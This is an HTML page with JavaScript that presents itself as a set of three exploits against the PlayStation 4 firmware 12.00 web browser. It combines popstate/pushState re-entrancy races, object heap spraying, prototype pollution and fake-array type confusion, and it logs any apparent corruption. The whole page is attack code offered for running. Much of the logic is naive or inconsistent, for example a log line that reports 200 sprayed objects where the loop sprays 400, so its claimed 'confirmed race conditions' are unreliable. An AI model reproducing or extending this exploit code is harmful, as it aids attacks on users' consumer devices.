<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Race Condition Exploitation 2</title>
</head>
<body>
<h2>PS4 12.00 - Popstate Race Condition Exploit</h2>
<p>Status: <span id="status">Ready</span></p>

<button onclick="runRaceExploit1()">EXPLOIT 1 - Race + Object Spray</button>
<button onclick="runRaceExploit2()">EXPLOIT 2 - Race + Memory Corruption</button>
<button onclick="runRaceExploit3()">EXPLOIT 3 - Race + Type Confusion</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ 
  logEl.textContent += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

var exploitState = {
  sprayed: [],
  corrupted: [],
  leaked: null
};

// =====================================================
// EXPLOIT 1 - Race + Object Spray
// =====================================================
async function runRaceExploit1(){
  logEl.textContent = "";
  exploitState = { sprayed: [], corrupted: [], leaked: null };
  statusEl.textContent = "Running Race Exploit 1...";
  
  log("=== EXPLOIT 1: Race + Object Spray ===\n");
  log("Goal: Spray objects during race window\n");
  
  // Pollution
  Array.prototype.raceMarker = 0xCAFEBABE;
  
  // Setup race handler
  let raceCount = 0;
  
  window.addEventListener('popstate', (e) => {
    raceCount++;
    
    if(raceCount >= 5 && raceCount <= 8) {
      log(`  ðŸ”¥ RACE WINDOW #${raceCount}`);
      
      // Spray objects in race window
      for(let i=0; i<400; i++) {
        let obj = {
          id: raceCount * 1000 + i,
          marker: 0xDEAD0000 + i,
          buffer: new ArrayBuffer(512)
        };
        exploitState.sprayed.push(obj);
      }
      
      log(`    Sprayed 200 objects`);
      
      // Reentrant push
      history.pushState({
        race: raceCount,
        timestamp: Date.now()
      }, "", "#race" + raceCount);
      
      log(`    Injected state during race`);
    }
  });
  
  log("[SETUP] Race handler registered\n");
  
  // Trigger UAF
  log("[PHASE 1] Triggering UAF");
  
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      data: [i, i*2, i*3]
    };
    
    let frag = "S".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  log("\n  UAF complete\n");
  
  await sleep(200);
  
  // Trigger race
  log("[PHASE 2] Triggering race condition");
  
  for(let i=0; i<10; i++) {
    history.back();
    await sleep(50);
  }
  
  await sleep(200);
  
  log(`\n[RESULT] Race triggers: ${raceCount}`);
  log(`Objects sprayed: ${exploitState.sprayed.length}`);
  
  // Check for corruption
  log("\n[VERIFY] Checking sprayed objects");
  
  let corrupted = 0;
  
  for(let obj of exploitState.sprayed) {
    let expected = 0xDEAD0000 + (obj.id % 1000);
    if(obj.marker !== expected) {
      log(`  Object ${obj.id} CORRUPTED: marker=0x${obj.marker.toString(16)}`);
      corrupted++;
      exploitState.corrupted.push(obj);
    }
  }
  
  log(`\nCorrupted objects: ${corrupted}/${exploitState.sprayed.length}`);
  
  if(corrupted > 0) {
    log("\nðŸš¨ MEMORY CORRUPTION CONFIRMED!");
    log("Race condition caused object corruption!");
    statusEl.textContent = "CORRUPTION VIA RACE";
  } else {
    log("\nâœ“ All objects intact");
    log("Race window exploited but no corruption detected");
  }
  
  delete Array.prototype.raceMarker;
  
  log("\n=== EXPLOIT 1 END ===");
}

// =====================================================
// EXPLOIT 2 - Race + Memory Read
// =====================================================
async function runRaceExploit2(){
  logEl.textContent = "";
  exploitState = { sprayed: [], corrupted: [], leaked: null };
  statusEl.textContent = "Running Race Exploit 2...";
  
  log("=== EXPLOIT 2: Race + Memory Corruption Attempt ===\n");
  log("Goal: Read/corrupt memory during race\n");
  
  // Pollution with extreme values
  Array.prototype.fakeLength = 0xFFFFFFFF;
  Array.prototype.fakeData = 0x41414141;
  
  let raceTriggered = false;
  
  window.addEventListener('popstate', (e) => {
    if(!raceTriggered && e.state && e.state.index >= 40) {
      raceTriggered = true;
      
      log(`  ðŸ”¥ CRITICAL RACE at index ${e.state.index}`);
      
      // Try to read during race
      try {
        let url = document.URL;
        exploitState.leaked = url.length;
        
        log(`    document.URL.length: ${url.length}`);
        
        // Try to access with fake length
        if(e.state.data && e.state.data.fakeLength) {
          log(`    Fake length accessible: 0x${e.state.data.fakeLength.toString(16)}`);
        }
        
        // Reentrant modification
        history.pushState({
          critical: true,
          leaked: url.length,
          data: [0xBE, 0xEF, 0xCA, 0xFE]
        }, "", "#critical");
        
        log(`    Critical state injected`);
        
      } catch(e) {
        log(`    Exception: ${e.message}`);
      }
    }
  });
  
  log("[SETUP] Critical race handler\n");
  
  // Trigger UAF
  log("[PHASE 1] UAF trigger");
  
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      data: [1, 2, 3, 4]
    };
    
    let frag = "M".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(200);
  
  // Trigger critical race
  log("\n[PHASE 2] Triggering critical race");
  
  for(let i=0; i<15; i++) {
    history.back();
    await sleep(30);
  }
  
  await sleep(200);
  
  log(`\n[RESULT] Race triggered: ${raceTriggered}`);
  log(`Leaked URL length: ${exploitState.leaked}`);
  
  // Navigate to critical state
  log("\n[VERIFY] Accessing critical state");
  
  while(history.state && !history.state.critical) {
    history.forward();
    await sleep(20);
  }
  
  if(history.state && history.state.critical) {
    log("Critical state found:");
    log(`  Leaked: ${history.state.leaked}`);
    log(`  Data: ${JSON.stringify(history.state.data)}`);
    
    // Check pollution
    if(history.state.data.fakeLength) {
      log(`  Pollution: 0x${history.state.data.fakeLength.toString(16)}`);
      
      log("\nâœ“ Pollution survived race!");
      statusEl.textContent = "RACE + POLLUTION SUCCESS";
    }
  }
  
  delete Array.prototype.fakeLength;
  delete Array.prototype.fakeData;
  
  log("\n=== EXPLOIT 2 END ===");
}

// =====================================================
// EXPLOIT 3 - Race + Type Confusion
// =====================================================
async function runRaceExploit3(){
  logEl.textContent = "";
  exploitState = { sprayed: [], corrupted: [], leaked: null };
  statusEl.textContent = "Running Race Exploit 3...";
  
  log("=== EXPLOIT 3: Race + Type Confusion ===\n");
  log("Goal: Combine race with type confusion\n");
  
  // Aggressive pollution
  Array.prototype.length = 0x1000;
  Object.prototype.constructor = Array;
  
  let confusionDetected = false;
  
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 42 && !confusionDetected) {
      log(`  ðŸ”¥ CONFUSION RACE at index ${e.state.index}`);
      
      // Create fake array during race
      let fakeArray = {
        0: 0x41,
        1: 0x42,
        2: 0x43,
        3: 0x44,
        length: 4
      };
      
      // Make it behave like array via pollution
      fakeArray.__proto__ = Array.prototype;
      
      log(`    Fake array created`);
      log(`    isArray: ${Array.isArray(fakeArray)}`);
      
      // Inject during race
      history.pushState({
        confused: true,
        fakeArray: fakeArray,
        realArray: [10, 20, 30, 40]
      }, "", "#confused");
      
      log(`    Confused state injected`);
      
      // Try to trigger confusion
      try {
        if(fakeArray.length !== 4) {
          log(`    ðŸš¨ Length confusion: ${fakeArray.length}`);
          confusionDetected = true;
        }
        
        // Try OOB access
        let val = fakeArray[100];
        if(val !== undefined) {
          log(`    ðŸš¨ OOB read: fakeArray[100] = 0x${val.toString(16)}`);
          confusionDetected = true;
        }
        
      } catch(e) {
        log(`    Exception: ${e.message}`);
      }
    }
  });
  
  log("[SETUP] Confusion handler\n");
  
  // Trigger UAF
  log("[PHASE 1] UAF trigger");
  
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      data: [i]
    };
    
    let frag = "T".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(200);
  
  // Trigger
  log("\n[PHASE 2] Triggering confusion");
  
  for(let i=0; i<15; i++) {
    history.back();
    await sleep(40);
  }
  
  await sleep(200);
  
  log(`\n[RESULT] Confusion detected: ${confusionDetected}`);
  
  // Check confused state
  log("\n[VERIFY] Checking confused state");
  
  while(history.state && !history.state.confused) {
    history.forward();
    await sleep(20);
  }
  
  if(history.state && history.state.confused) {
    log("Confused state found");
    
    let fake = history.state.fakeArray;
    let real = history.state.realArray;
    
    log(`  Fake array length: ${fake.length}`);
    log(`  Real array length: ${real.length}`);
    
    // Compare
    if(fake.length !== 4 || fake.length === real.length) {
      log("\nðŸš¨ TYPE CONFUSION VIA RACE!");
      log("Fake array confused with real array!");
      statusEl.textContent = "TYPE CONFUSION VIA RACE";
    }
  }
  
  delete Array.prototype.length;
  delete Object.prototype.constructor;
  
  log("\n=== EXPLOIT 3 END ===");
}

log("PS4 12.00 - Race Condition Exploitation");
log("\nConfirmed race conditions:");
log("âœ“ Popstate race (reentrant pushState)");
log("âœ“ Hashchange race (event timing)");
log("\nExploits:");
log("1. Race + Object Spray (memory corruption)");
log("2. Race + Memory Read (critical timing)");
log("3. Race + Type Confusion (fake arrays)");
log("\nGoal: Find exploitable primitive via race");
</script>
</body>
</html>
